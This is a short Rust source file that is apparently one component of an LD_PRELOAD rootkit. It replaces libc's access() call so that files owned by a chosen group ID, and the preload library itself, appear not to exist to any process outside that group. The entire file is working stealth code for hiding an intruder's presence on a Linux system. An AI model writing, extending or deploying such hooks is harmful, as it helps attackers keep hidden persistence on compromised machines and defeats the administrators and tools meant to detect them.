use std::ffi::{c_void, c_char, c_int, CStr};
use libc::getegid;
use errno::{Errno, set_errno};

extern crate config;
extern crate stat;
use config::{GID, PRELOAD};
use stat::__lxstat;

// yippee
#[no_mangle]
pub extern "C" fn access(path: *const c_char, mode: c_int) -> c_int {
    let o_access: *mut c_void = unsafe { libc::dlsym(libc::RTLD_NEXT, b"access\0".as_ptr() as *const _) };
    let o_access: extern "C" fn(*const c_char, c_int) -> c_int = unsafe { std::mem::transmute(o_access) };

    let gid = unsafe { getegid() };
    if gid == GID {
        return o_access(path, mode);
    }

    let mut stat_buf: libc::stat = unsafe { std::mem::zeroed() };
    __lxstat(2, path, &mut stat_buf);

    if (stat_buf.st_gid == GID) || unsafe { CStr::from_ptr(path).to_str().unwrap().contains(PRELOAD) } {
        set_errno(Errno(libc::ENOENT));
        return -1;
    }

    return o_access(path, mode);
}
